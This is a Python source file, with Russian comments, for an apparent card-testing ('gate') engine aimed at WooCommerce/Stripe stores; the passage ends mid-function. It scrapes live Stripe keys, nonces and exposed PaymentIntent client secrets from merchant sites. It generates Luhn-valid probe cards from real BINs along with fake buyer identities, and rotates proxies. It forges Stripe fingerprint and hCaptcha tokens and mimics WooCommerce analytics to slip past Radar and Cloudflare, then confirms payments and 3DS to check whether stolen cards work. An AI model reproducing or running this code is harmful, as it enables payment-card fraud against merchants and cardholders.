# language: Python 3.12+, file: gate_client.py, target: Windows 11, deps: curl_cffi
# Shared WooCommerce/Stripe gate engine — single source of truth for setup_gate.py,
# advanced_gate_scanner.py и scratch-диагностики. Любая правка верстки WooCommerce
# чинится ЗДЕСЬ один раз.
import asyncio
import json
import os
import random
import re
import string
import uuid
from datetime import datetime, timezone

import config as _cfg
import pusto_logger as _log

STRIPE_API_VERSION = _cfg.STRIPE_API_VERSION
STRIPE_JS_BUILD = _cfg.STRIPE_JS_BUILD

# --- Regex'ы: единственный источник ---
RE_REG_NONCE = re.compile(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']')
RE_PK_LIVE = re.compile(r'pk_live_[0-9a-zA-Z]{24,}')
RE_UPE_NONCE = re.compile(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']')
RE_LEGACY_NONCE = re.compile(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']')
RE_LEGACY_NONCE_ALT = re.compile(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']')
# Задел под миграцию Payment Element на Confirmation Tokens (ИССЛЕДОВАНИЕ.md §8.4):
# JS-переменная/атрибут с confirmationToken nonce + сам id ctoken_*
RE_CTOKEN_NONCE = re.compile(r'confirmationToken(?:Nonce)?["\']?\s*[:=]\s*["\']([^"\']+)["\']')
RE_CTOKEN_ID = re.compile(r'ctoken_[0-9A-Za-z]{20,}')

# --- Sprint 3 (Фаза 2): PaymentIntent-вектор ---
# client_secret торчит на checkout-страницах в 5 формах (auth-mechanics.md §6)
RE_CLIENT_SECRET = re.compile(r'(pi_[0-9A-Za-z]{6,}_secret_[0-9A-Za-z]{8,})')
RE_CS_DATA_ATTR = re.compile(r'data-client-secret=["\'](pi_[0-9A-Za-z]{6,}_secret_[0-9A-Za-z]{8,})')
RE_CS_JS_VAR = re.compile(r'(?:var|let|const)?\s*(?:window\.)?[A-Z_a-z]*[Cc]lient[_Ss]ecret\w*\s*=\s*["\'](pi_[0-9A-Za-z]{6,}_secret_[0-9A-Za-z]{8,})')
RE_CS_URL_PARAM = re.compile(r'[?&]payment_intent_client_secret=(pi_[0-9A-Za-z]{6,}_secret_[0-9A-Za-z]{8,})')
RE_CS_JSON = re.compile(r'"clientSecret"\s*:\s*"(pi_[0-9A-Za-z]{6,}_secret_[0-9A-Za-z]{8,})')
RE_CS_META = re.compile(r'<meta[^>]+name=["\']stripe-client-secret["\'][^>]+content=["\'](pi_[0-9A-Za-z]{6,}_secret_[0-9A-Za-z]{8,})')
RE_REGISTER_FORM = re.compile(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', re.S)
RE_HIDDEN_INPUT = re.compile(r'<input[^>]*type=["\']hidden["\'][^>]*>')
RE_INPUT_NAME = re.compile(r'name=["\']([^"\']+)["\']')
RE_INPUT_VALUE = re.compile(r'value=["\']([^"\']*)["\']')

CF_CHALLENGE_MARKS = (
    "Just a moment...",
    "Attention Required! | Cloudflare",
    "challenge-platform",
    "cf-turnstile-wrapper",
)

# --- Cloudflare Turnstile: селекторы и атрибуты виджета (2026) ---
RE_TURNSTILE_CONTAINER = re.compile(
    r'<div[^>]*class=["\'][^"\']*\b(?:cf-turnstile|cf-turnstile-wrapper)\b[^"\']*["\'][^>]*>',
    re.IGNORECASE
)
RE_TURNSTILE_SITEKEY = re.compile(r'data-sitekey=["\']([^"\']+)["\']', re.IGNORECASE)
RE_TURNSTILE_ACTION = re.compile(r'data-action=["\']([^"\']+)["\']', re.IGNORECASE)
RE_TURNSTILE_CDATA = re.compile(r'data-cdata=["\']([^"\']+)["\']', re.IGNORECASE)
RE_TURNSTILE_RENDER = re.compile(
    r'turnstile\.render\s*\(\s*[\'"][^\'"]+[\'"]\s*,\s*\{([^}]+)\}',
    re.IGNORECASE
)

# --- Identity pools: без фиксированного паттерна alex.*@gmail ---
FIRST_NAMES = [
    "James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph",
    "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul",
    "Andrew", "Joshua", "Kenneth", "Kevin", "Brian", "George", "Edward", "Ronald",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Anderson", "Taylor", "Thomas", "Moore", "Jackson",
    "Martin", "Lee", "Clark", "Lewis", "Walker", "Hall", "Young", "King", "Wright",
]
EMAIL_DOMAINS = [
    "gmail.com", "outlook.com", "yahoo.com", "hotmail.com", "icloud.com",
    "proton.me", "aol.com", "zoho.com",
]
# --- Гео-пулы: city/state/zip выровнены по индексу — реальная связка на страну ---
# Формат: alpha2 -> [(city, region, zip), ...]; fallback всегда US
GEO_POOLS: dict[str, list[tuple[str, str, str]]] = {
    "US": [
        ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Houston", "TX", "77001"),
        ("Phoenix", "AZ", "85001"), ("Philadelphia", "PA", "19101"), ("San Antonio", "TX", "78201"),
        ("San Diego", "CA", "92101"), ("Dallas", "TX", "75201"), ("Austin", "TX", "73301"),
    ],
    "GB": [("London", "England", "SW1A 1AA"), ("Manchester", "England", "M1 1AA"),
           ("Birmingham", "England", "B1 1AA")],
    "AU": [("Sydney", "NSW", "2000"), ("Melbourne", "VIC", "3000"), ("Brisbane", "QLD", "4000")],
    "CA": [("Toronto", "ON", "M5H 2N2"), ("Vancouver", "BC", "V6B 1A1"), ("Montreal", "QC", "H3A 1A1")],
    "DE": [("Berlin", "DE-BE", "10115"), ("Munich", "DE-BY", "80331"), ("Hamburg", "DE-HH", "20095")],
    "FR": [("Paris", "IDF", "75001"), ("Lyon", "ARA", "69001"), ("Marseille", "PAC", "13001")],
    "NL": [("Amsterdam", "NH", "1012 AB"), ("Rotterdam", "ZH", "3011 BK"), ("Utrecht", "UT", "3511 LM")],
    "IT": [("Roma", "RM", "00100"), ("Milano", "MI", "20100"), ("Napoli", "NA", "80100")],
    "ES": [("Madrid", "M", "28001"), ("Barcelona", "B", "08001"), ("Valencia", "V", "46001")],
    "LT": [("Vilnius", "VL", "01101"), ("Kaunas", "KU", "44248"), ("Klaipeda", "KL", "92117")],
    "NZ": [("Wellington", "WGN", "6011"), ("Auckland", "AUK", "1010"), ("Christchurch", "CAN", "8011")],
    "IE": [("Dublin", "L", "D01"), ("Cork", "C", "T12"), ("Galway", "G", "H91")],
    "PL": [("Warszawa", "MA", "00-001"), ("Krakow", "MP", "31-001"), ("Gdansk", "PM", "80-001")],
    "CH": [("Zurich", "ZH", "8001"), ("Bern", "BE", "3001"), ("Basel", "BS", "4051")],
    "AT": [("Wien", "W", "1010"), ("Graz", "ST", "8010"), ("Salzburg", "S", "5020")],
    "BE": [("Brussel", "BRU", "1000"), ("Antwerpen", "VLG", "2000"), ("Gent", "VLG", "9000")],
    "SE": [("Stockholm", "AB", "11120"), ("Goteborg", "O", "41118"), ("Malmo", "M", "21122")],
    "PT": [("Lisboa", "LI", "1000"), ("Porto", "PO", "4000"), ("Braga", "BG", "4700")],
}
_CITIES = [c for c, _, _ in GEO_POOLS["US"]]
_STATES = [s for _, s, _ in GEO_POOLS["US"]]
_ZIPS = [z for _, _, z in GEO_POOLS["US"]]

_STREETS = ["Main", "Oak", "Maple", "Cedar", "Park", "Lake", "Hill", "Church"]

# NL-магазины с Dutch Postcode plugin (wcnlpc) требуют реальный формат улицы:
# голландское название + номер, иначе missing_street_name
_NL_STREETS = ["Damstraat", "Kalverstraat", "Hoogstraat", "Witte de Withstraat",
               "Neude", "Oudegracht", "Coolsingel", "Kruisstraat"]


def geo_identity_fields(country_code: str = "US") -> dict:
    """Случайный адрес из пула страны; неизвестная страна → US."""
    cc = (country_code or "US").upper()
    pool = GEO_POOLS.get(cc, GEO_POOLS["US"])
    city, state, zc = random.choice(pool)
    if cc == "NL":
        street = f"{random.choice(_NL_STREETS)} {random.randint(1, 200)}"
    else:
        street = f"{random.randint(100, 9999)} {random.choice(_STREETS)} Street"
    return {
        "line1": street,
        "city": city,
        "state": state,
        "postal_code": zc,
        "country": cc if cc in GEO_POOLS else "US",
    }

# BIN-пулы пробников: живые диапазоны MC/VISA, 16 цифр
_PROBE_BINS = ["517546", "558874", "542251", "453927", "491767", "448528", "530672", "455951"]


def rand_str(k: int = 8, chars: str = string.ascii_lowercase + string.digits) -> str:
    return "".join(random.choices(chars, k=k))


# country_name -> alpha2 для bins.antipublic.cc (6.3)
_ANTIPUBLIC_A2 = {
    "united states": "US", "canada": "CA", "united kingdom": "GB", "australia": "AU",
    "germany": "DE", "france": "FR", "italy": "IT", "spain": "ES", "netherlands": "NL",
    "sweden": "SE", "switzerland": "CH", "ireland": "IE", "new zealand": "NZ",
    "brazil": "BR", "mexico": "MX", "india": "IN", "japan": "JP", "singapore": "SG",
    "poland": "PL", "portugal": "PT", "belgium": "BE", "austria": "AT", "norway": "NO",
    "denmark": "DK", "finland": "FI", "czech republic": "CZ", "romania": "RO",
    "turkey": "TR", "israel": "IL", "south africa": "ZA", "qatar": "QA",
    "united arab emirates": "AE", "saudi arabia": "SA", "hong kong": "HK",
}


def check_luhn(card_num: str) -> bool:
    digits = [int(d) for d in str(card_num) if d.isdigit()]
    if len(digits) < 13 or len(digits) > 19:
        return False
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            doubled = d * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += d
    return checksum % 10 == 0


def luhn_check_digit(partial: str) -> int:
    """Контрольная цифра, доводящая partial до Luhn-валидного номера."""
    digits = [int(d) for d in partial if d.isdigit()]
    checksum = 0
    # справа налево, позиции с учётом будущей контрольной цифры
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 0:
            doubled = d * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += d
    return (10 - checksum % 10) % 10


def gen_probe_card(bin_prefix: str | None = None) -> dict:
    """Случайный Luhn-валидный пробник вместо одного захаркоженного PAN."""
    prefix = bin_prefix if bin_prefix else random.choice(_PROBE_BINS)
    body = "".join(random.choices(string.digits, k=15 - len(prefix)))
    partial = prefix + body
    mm = f"{random.randint(1, 12):02d}"
    yy = str(random.randint(1, 4) + datetime.now().year)
    return {
        "number": partial + str(luhn_check_digit(partial)),
        "mm": mm,
        "month": mm,
        "yy": yy,
        "year": yy,
        "cvc": f"{random.randint(0, 999):03d}",
    }


def extract_pan(raw: str) -> str:
    """Извлекает только номер карты (PAN 13-19 цифр) из любой строки."""
    clean = str(raw).strip()
    if not clean:
        return ""
    first_chunk = re.split(r"[|:;/]", clean)[0].strip()
    tokens = first_chunk.split()
    if len(tokens) >= 4:
        if all(len(t) == 4 and t.isdigit() for t in tokens[:4]):
            return "".join(tokens[:4])
        if len(tokens[0]) >= 13 and tokens[0].isdigit():
            return tokens[0]
    elif len(tokens) > 1:
        if len(tokens[0]) >= 13 and tokens[0].isdigit():
            return tokens[0]
        joined = "".join(tokens)
        if 13 <= len(joined) <= 19 and joined.isdigit():
            return joined

    digits = "".join(ch for ch in tokens[0] if ch.isdigit()) if tokens else ""
    if len(digits) >= 13:
        return digits[:19]
    m = re.search(r"\b(\d{13,19})\b", clean)
    return m.group(1) if m else digits


def parse_card(raw: str) -> dict:
    clean = str(raw).strip()
    # Разделители: | : ; / пробелы (если не URL). Поддержка смешанных разделителей вида PAN|MM/YY|CVC
    delim = r"[|:;/\s]+" if not clean.startswith("http") else r"[|:;\s]+"
    parts = [p for p in re.split(delim, clean) if p]

    # "4111 1111 1111 1111 09 25 123" — 4-блочный PAN + MM YY CVV:
    # раньше number=parts[0]="4111", mm="1111" — мусор на ровном месте
    if len(parts) >= 7 and all(len(p) == 4 and p.isdigit() for p in parts[:4]):
        parts = ["".join(parts[:4])] + parts[4:]

    if len(parts) < 3:
        digits_chunks = re.findall(r"\d+", clean)
        parts = digits_chunks if len(digits_chunks) >= 3 else parts

    number = parts[0].strip() if len(parts) > 0 else ""
    mm = parts[1].strip().zfill(2) if len(parts) > 1 else "01"
    yy = parts[2].strip() if len(parts) > 2 else "2030"
    yy_4 = "20" + yy[-2:] if len(yy) <= 2 else yy
    yy_2 = yy_4[-2:]
    cvc_raw = parts[3].strip() if len(parts) > 3 else ""
    cvc = cvc_raw if cvc_raw else f"{random.randint(0, 999):03d}"
    return {
        "number": number,
        "month": mm,
        "mm": mm,
        "year": yy_4,
        "yy": yy_4,
        "yy2": yy_2,
        "cvc": cvc,
        "raw": clean,
    }


def mask_pan(raw: str) -> str:
    num = extract_pan(raw)
    return f"{num[:6]}******{num[-4:]}" if len(num) >= 10 else num


# --- Прокси-слой: пул data/proxies.txt + ротация ---

PROXIES_FILE = os.path.join("data", "proxies.txt")


def normalize_proxy(line: str | None) -> str | None:
    """Нормализует любую строку прокси в валидный URL со схемой:
    - host:port | SOCKS5 | 119ms -> socks5://host:port
    - host:port | SOCKS4 | 118ms -> socks4://host:port
    - host:port | HTTP | 36ms   -> http://host:port
    - scheme://user:pass@host:port -> сохраняет схему
    - host:port:user:pass        -> http://user:pass@host:port
    - host:port                  -> http://host:port
    """
    if not line:
        return None
    p = str(line).strip()
    if not p or p.startswith("#"):
        return None
    if "|" in p:
        parts = [seg.strip() for seg in p.split("|")]
        host_port = parts[0]
        proto = parts[1].lower() if len(parts) > 1 else "http"
        scheme = "socks5" if "socks5" in proto else ("socks4" if "socks4" in proto else "http")
        return f"{scheme}://{host_port}"
    if "://" in p:
        return p
    toks = p.split(":")
    if len(toks) == 4:
        return f"http://{toks[2]}:{toks[3]}@{toks[0]}:{toks[1]}"
    elif len(toks) == 2:
        return f"http://{p}"
    return f"http://{p}"


def load_proxies(path: str = PROXIES_FILE) -> list[str]:
    """Строки любого формата нормализуются в scheme://host:port без дубликатов."""
    proxies = []
    seen = set()
    if os.path.exists(path):
        with open(path, encoding="utf-8", errors="ignore") as f:
            for line in f:
                norm = normalize_proxy(line)
                if norm and norm not in seen:
                    seen.add(norm)
                    proxies.append(norm)
    return proxies


def pick_proxy(pool: list[str] | None, explicit: str | None) -> str | None:
    """Явный --proxy приоритетнее. Иначе выбор из пула с обязательным условием:
    прокси должен быть реально проверенным и живым (alive=True в proxy_health.json).
    Если живых проверенных прокси нет — возвращает None (прямое подключение),
    чтобы ни в коем случае НЕ ломать чеки пользователю непроверенными узлами!"""
    if explicit:
        if explicit.strip().lower() in ("direct", "none", "no"):
            return None
        return normalize_proxy(explicit)
    if not pool:
        return None

    health_file = os.path.join("data", "proxy_health.json")
    health_map = {}
    if os.path.exists(health_file):
        try:
            with open(health_file, encoding="utf-8") as f:
                health_map = {h["url"]: h for h in json.load(f) if isinstance(h, dict)}
        except Exception:
            health_map = {}

    verified_alive = []
    weights = []
    for p in pool:
        h = health_map.get(p)
        if not h:
            continue
        if h.get("alive") is True and h.get("fail_count", 0) < 2 and h.get("latency_ms"):
            lat = max(h["latency_ms"], 20)
            proto_mult = 2.0 if p.startswith("socks5://") else (1.0 if p.startswith("http://") or p.startswith("https://") else 0.8)
            fails = h.get("fail_count", 0)
            weight = ((1000.0 / lat) ** 2) * proto_mult / (1.0 + fails * 2.0)
            verified_alive.append(p)
            weights.append(weight)

    if not verified_alive:
        # Если валидация еще не завершилась — используем случайный узел из пула вместо незащищенного DIRECT
        return random.choice(pool) if pool else None

    try:
        return random.choices(verified_alive, weights=weights, k=1)[0]
    except Exception:
        return verified_alive[0]


# --- Сетевая гигиена: детект капчи + экспоненциальный backoff ---

CAPTCHA_MARKS = (
    "anomaly",
    "captcha",
    "unusual traffic",
    "prove you're human",
    "are you a robot",
)


def looks_like_captcha(html: str) -> bool:
    low = (html or "").lower()
    return any(mark in low for mark in CAPTCHA_MARKS)


async def backoff_sleep(attempt: int, base: float = 2.0, jitter: float = 0.5):
    """Экспоненциальная пауза: attempt 0 → base, дальше ×2 с джиттером."""
    delay = base * (2 ** attempt) + random.uniform(0, jitter)
    await asyncio.sleep(delay)


def polite_delay(base: float = 1.2, spread: float = 1.3):
    """Обычная вежливая пауза между запросами — рандомизированная."""
    return asyncio.sleep(random.uniform(base, base + spread))


def random_identity(country_code: str = "US") -> dict:
    geo = geo_identity_fields(country_code)
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    return {
        "first_name": first,
        "last_name": last,
        "name": f"{first} {last}",
        "email": f"{first.lower()}.{rand_str(7)}@{random.choice(EMAIL_DOMAINS)}",
        "username": f"{first.lower()}_{rand_str(6)}",
        "password": f"S{rand_str(10)}!{random.randint(2, 9)}aA",
        **geo,
    }


def is_cloudflare_challenge(html: str) -> bool:
    return any(mark in html for mark in CF_CHALLENGE_MARKS)


def extract_reg_nonce(html: str) -> str | None:
    m = RE_REG_NONCE.search(html)
    return m.group(1) if m else None


def extract_pk_live(html: str) -> str:
    m = RE_PK_LIVE.findall(html)
    return m[0] if m else ""


def extract_honeypot_fields(form_html: str, body: dict) -> dict:
    """Возвращает body, дополненный hidden-полями формы регистрации (анти-спам токены)."""
    for inp in RE_HIDDEN_INPUT.findall(form_html):
        nm = RE_INPUT_NAME.search(inp)
        vl = RE_INPUT_VALUE.search(inp)
        if nm and vl and nm.group(1) not in body:
            body[nm.group(1)] = vl.group(1)
    return body


def extract_register_form_html(page_html: str) -> str:
    m = RE_REGISTER_FORM.search(page_html)
    return m.group(1) if m else page_html


def scrape_gate(pm_html: str) -> dict:
    """pk_live + все варианты SetupIntent/ConfirmationToken nonce со страницы add-payment-method."""
    pk = extract_pk_live(pm_html)
    upe_m = RE_UPE_NONCE.search(pm_html)
    legacy_m = RE_LEGACY_NONCE.search(pm_html)
    legacy = legacy_m.group(1) if legacy_m else ""
    if not legacy:
        alt_m = RE_LEGACY_NONCE_ALT.search(pm_html)
        if alt_m:
            legacy = alt_m.group(1)
    ctoken_m = RE_CTOKEN_NONCE.search(pm_html)
    ctoken_id_m = RE_CTOKEN_ID.search(pm_html)
    return {
        "pk": pk,
        "upe_nonce": upe_m.group(1) if upe_m else "",
        "legacy_nonce": legacy,
        "ctoken_nonce": ctoken_m.group(1) if ctoken_m else "",
        "ctoken_id": ctoken_id_m.group(0) if ctoken_id_m else "",
    }


def extract_turnstile_params(html: str) -> dict | None:
    """Извлекает параметры Cloudflare Turnstile из HTML-страницы.
    Возвращает словарь {'sitekey': ..., 'action': ..., 'cdata': ...} или None."""
    if not html or "turnstile" not in html.lower():
        return None

    sitekey = None
    action = None
    cdata = None

    m_div = RE_TURNSTILE_CONTAINER.search(html)
    if m_div:
        tag = m_div.group(0)
        sk = RE_TURNSTILE_SITEKEY.search(tag)
        if sk:
            sitekey = sk.group(1)
        act = RE_TURNSTILE_ACTION.search(tag)
        if act:
            action = act.group(1)
        cd = RE_TURNSTILE_CDATA.search(tag)
        if cd:
            cdata = cd.group(1)

    if not sitekey:
        sk = RE_TURNSTILE_SITEKEY.search(html)
        if sk:
            sitekey = sk.group(1)

    if not sitekey:
        m_render = RE_TURNSTILE_RENDER.search(html)
        if m_render:
            block = m_render.group(1)
            sk = re.search(r'[\'"]?sitekey[\'"]?\s*:\s*[\'"]([^\'"]+)[\'"]', block)
            if sk:
                sitekey = sk.group(1)
            act = re.search(r'[\'"]?action[\'"]?\s*:\s*[\'"]([^\'"]+)[\'"]', block)
            if act:
                action = act.group(1)
            cd = re.search(r'[\'"]?cData[\'"]?\s*:\s*[\'"]([^\'"]+)[\'"]', block)
            if cd:
                cdata = cd.group(1)

    if not sitekey:
        return None

    return {
        "sitekey": sitekey,
        "action": action or "",
        "cdata": cdata or "",
    }


def parse_stripe_cookies(set_cookie_headers: list[str] | None) -> dict:
    """__stripe_mid/__stripe_sid из Set-Cookie ответа m.stripe.com/6.
    Возвращает {"mid": ..., "sid": ...} — отсутствующие ключи пустые."""
    out = {"mid": "", "sid": ""}
    for raw in set_cookie_headers or []:
        for part in str(raw).split(";"):
            name, _, value = part.strip().partition("=")
            if name == "__stripe_mid" and not out["mid"]:
                out["mid"] = value.strip()
            elif name == "__stripe_sid" and not out["sid"]:
                out["sid"] = value.strip()
    return out


def m_stripe_beacon_payload() -> dict:
    """Тело beacon-POST к m.stripe.com/6 (пустая форма тоже валидна — сервер минтует сам)."""
    return {"v": "t", "url": "", "lsid": str(uuid.uuid4()),
            "guid": str(uuid.uuid4()), "muid": str(uuid.uuid4())}


def parse_m_stripe_response(data: dict) -> dict:
    """Серверные fingerprint-токены из JSON-ответа m.stripe.com/6 (POST).
    Формат значений: <uuid><6 hex> — живые Radar-идентификаторы сессии."""
    out = {"muid": "", "sid": "", "guid": ""}
    if isinstance(data, dict):
        for k in out:
            v = data.get(k)
            if isinstance(v, str) and len(v) >= 20:
                out[k] = v
    return out


async def fetch_hcaptcha_radar_token(session, pk: str, donor_host: str) -> str | None:
    """hcaptcha_token для radar_options (мимикрия stripecc1 шаг 4-5):
    wallet-config отдаёт sitekey → checksiteconfig отдаёт P1_-токен.
    Любой сбой → None, вызывающий шлёт тело без токена."""
    try:
        r = await session.post(
            "https://merchant-ui-api.stripe.com/elements/wallet-config",
            data={
                "stripe_js_id": str(uuid.uuid4()),
                "referrer_host": donor_host.replace("https://", "").replace("http://", ""),
                "key": pk,
                "request_surface": "web_split_card_element_popup",
            },
            # Origin обязан быть js.stripe.com (мерчантский origin → 403 invalid_request_http_origin),
            # Referer — живая страница донора, где элементы рендерятся
            headers={"Origin": "https://js.stripe.com",
                     "Referer": f"https://{donor_host.replace('https://', '').replace('http://', '')}/my-account/add-payment-method/",
                     "Accept": "application/json"},
            timeout=8,
        )
        sitekey = _find_key(r.json(), "link_hcaptcha_site_key") or ""
        if not sitekey:
            return None
        r2 = await session.post(
            "https://api.hcaptcha.com/checksiteconfig",
            params={"v": STRIPE_JS_BUILD, "sitekey": sitekey,
                    "host": "b.stripecdn.com", "sc": "1", "swa": "1"},
            headers={"Origin": "https://b.stripecdn.com", "Referer": "https://b.stripecdn.com/",
                     "Accept": "application/json"},
            timeout=8,
        )
        req_tok = (_find_key(r2.json(), "req") or "")
        if not req_tok:
            return None
        return req_tok if req_tok.startswith("P1_") else f"P1_{req_tok}"
    except Exception:
        return None


def _find_key(obj, key: str):
    """Рекурсивный поиск значения по ключу в JSON-ответе любой вложенности."""
    if isinstance(obj, dict):
        if key in obj and isinstance(obj[key], str) and obj[key]:
            return obj[key]
        for v in obj.values():
            hit = _find_key(v, key)
            if hit:
                return hit
    elif isinstance(obj, list):
        for v in obj:
            hit = _find_key(v, key)
            if hit:
                return hit
    return None


def extract_client_secrets(html: str) -> list[dict]:
    """Sprint 2.1 (Фаза 2): все client_secret со страницы с классификацией вектора.
    Каждый dict: {secret, pi_id, source} — source из 5 известных форм."""
    found: list[dict] = []
    seen: set[str] = set()

    def add(secret: str, source: str):
        if secret and secret not in seen:
            seen.add(secret)
            found.append({"secret": secret,
                          "pi_id": secret.split("_secret_")[0],
                          "source": source})

    for rx, tag in ((RE_CS_DATA_ATTR, "data-attr"), (RE_CS_JS_VAR, "js-var"),
                    (RE_CS_URL_PARAM, "url-param"), (RE_CS_JSON, "json"),
                    (RE_CS_META, "meta")):
        for m in rx.finditer(html):
            add(m.group(1), tag)
    # добор: секреты вне известных обёрток
    for m in RE_CLIENT_SECRET.finditer(html):
        add(m.group(1), "unknown")
    return found


def detect_secret_mints(html: str, base_url: str) -> list[str]:
    """Sprint 2.2 (Фаза 2): эндпоинты, минтующие свежий PaymentIntent по запросу.
    Все абсолютные эндпоинты якорятся к КОРНЮ сайта (scheme://host), не к пути
    страницы — иначе получаем /checkout/wp-json/... мусор."""
    mints: list[str] = []
    from urllib.parse import urlparse
    p = urlparse(base_url)
    root = f"{p.scheme}://{p.netloc}"
    if re.search(r'wc[-_]?ajax=wc_stripe_create_payment_intent', html, re.I) or \
       'wc_stripe_create_payment_intent' in html:
        ep = f"{root}/?wc-ajax=wc_stripe_create_payment_intent"
        if ep not in mints:
            mints.append(ep)
    if 'wc/store/v1/checkout' in html or '/wp-json/wc/store/v1' in html:
        ep = f"{root}/wp-json/wc/store/v1/checkout"
        if ep not in mints:
            mints.append(ep)
    if 'give_process_donation' in html:
        ep = f"{root}/wp-admin/admin-ajax.php?action=give_process_donation"
        if ep not in mints:
            mints.append(ep)
    if 'wpforms_stripe_create_payment_intent' in html:
        ep = f"{root}/wp-admin/admin-ajax.php?action=wpforms_stripe_create_payment_intent"
        if ep not in mints:
            mints.append(ep)
    for m in re.finditer(r'["\'](/(?:api/)?[\w./-]*(?:create-payment-intent|payment-intent)s?)["\']', html):
        ep = f"{root}{m.group(1)}"
        if ep not in mints:
            mints.append(ep)
    return mints


def wc_attribution_fields(donor_url: str) -> dict:
    """wc_order_attribution_* — копия аналитики WooCommerce (мимикрия MeduzaVIP).
    Без этих полей запрос выглядит ботом для плагинов, следящих за UTM."""
    base = donor_url.rstrip("/")
    return {
        "wc_order_attribution_source_type": "organic",
        "wc_order_attribution_referrer": "https://www.google.com/",
        "wc_order_attribution_utm_campaign": "(none)",
        "wc_order_attribution_utm_source": "(direct)",
        "wc_order_attribution_utm_medium": "(none)",
        "wc_order_attribution_utm_content": "(none)",
        "wc_order_attribution_utm_term": "(none)",
        "wc_order_attribution_session_entry": f"{base}/my-account/add-payment-method/",
        "wc_order_attribution_session_start_time": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
        "wc_order_attribution_session_pages": "2",
        "wc_order_attribution_session_count": "1",
    }


# --- Sprint 3 core (Фаза 2): PaymentIntent retrieve/confirm + 3DS2 ---

# единственный источник — config.py (дубль убран: рассинхрон при смене порога)
MAX_PI_AMOUNT_CENTS = _cfg.MAX_PI_AMOUNT_CENTS


async def stripe_retrieve_pi(session, pk: str, secret: str) -> dict | None:
    """Разведка перед confirm (бесплатно): amount/currency/capture_method/status.
    None = секрет мёртв или сеть упала."""
    pi_id = secret.split("_secret_")[0]
    try:
        r = await session.get(
            f"https://api.stripe.com/v1/payment_intents/{pi_id}",
            params={"key": pk, "client_secret": secret},
            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                     "Accept": "application/json"},
            timeout=10)
        _log.log_http("GET", f"https://api.stripe.com/v1/payment_intents/{pi_id}", r.status_code)
        if r.status_code != 200:
            return None
        d = r.json()
        if d.get("error"):
            return None
        return {"amount": d.get("amount"), "currency": (d.get("currency") or "").upper(),
                "capture_method": d.get("capture_method"), "status": d.get("status"),
                "last_payment_error": d.get("last_payment_error")}
    except Exception:
        return None


async def stripe_confirm_pi(session, pk: str, secret: str, pm_id: str,
                            donor_origin: str, telem: dict) -> dict:
    """POST /v1/payment_intents/{pi}/confirm с полным fingerprint-набором.
    Возвращает сырой JSON Stripe; классификация — classify_pi_verdict()."""
    pi_id = secret.split("_secret_")[0]
    body = {
        "key": pk,
        "client_secret": secret,
        "payment_method": pm_id,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "return_url": f"{donor_origin.rstrip('/')}/",
        "payment_user_agent": telem["payment_user_agent"],
        "referrer": donor_origin,
        "time_on_page": telem["time_on_page"],
        "guid": telem["guid"],
        "muid": telem["muid"],
        "sid": telem["sid"],
    }
    try:
        r = await session.post(
            f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
            data=body,
            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                     "Accept": "application/json"},
            timeout=12)
        _log.log_http("POST", f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm", r.status_code)
        return r.json()
    except Exception as e:
        _log.log_error("stripe", f"confirm_pi network error on {pi_id}", e)
        return {"error": {"type": "network_error", "message": f"{type(e).__name__}: {e}"}}


async def stripe_3ds2_authenticate(session, pk: str, source_id: str) -> dict:
    """3DS2 fingerprint/challenge-вход. transStatus Y → frictionless,
    C → challenge (карта жива и enrolled), иначе failed."""
    browser = {
        "fingerprintAttempted": True,
        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "language": "en-US",
        "colorDepth": 24,
        "screenHeight": 1080,
        "screenWidth": 1920,
        "timeZoneOffset": -120,
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "javaEnabled": False,
        "javascriptEnabled": True,
    }
    import json as _json
    try:
        r = await session.post(
            "https://api.stripe.com/v1/3ds2/authenticate",
            data={"key": pk,
                  "source": source_id,
                  "browser": _json.dumps(browser)},
            headers={"Origin": "https://js.stripe.com", "Referer": "https://js.stripe.com/",
                     "Accept": "application/json"},
            timeout=12)
        _log.log_http("POST", "https://api.stripe.com/v1/3ds2/authenticate", r.status_code)
        d = r.json()
        ts = _find_key(d, "transStatus") or ""
        state = _find_key(d, "state") or ""
        return {"transStatus": ts, "state": state, "raw": d}
    except Exception as e:
        _log.log_error("stripe", f"3ds2_authenticate network error on {source_id}", e)
        return {"transStatus": "", "state": "", "raw": {"error": str(e)}}


RE_AUTOSUBMIT_FORM = re.compile(
    r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>(.*?)</form>', re.S | re.I)


async def stripe_3ds_follow_redirect(session, redirect_url: str, max_hops: int = 5) -> dict:
    """3DS1/fallback: цепочка auto-submit форм до финального лендинга.
    Cookie-jar обязателен (ACS ставит свои куки). Возвращает последний HTML+URL."""
    url = redirect_url
    html = ""
    for _ in range(max_hops):
        try:
            r = await session.get(url, timeout=12, allow_redirects=True)
            html = r.text
            url = str(r.url)
        except Exception as e:
            return {"final_url": url, "html": "", "posted": False, "error": str(e)}
        m = RE_AUTOSUBMIT_FORM.search(html)
        if not m or ("onload" not in html and "submit()" not in html):
            break
        action, inner = m.group(1), m.group(2)
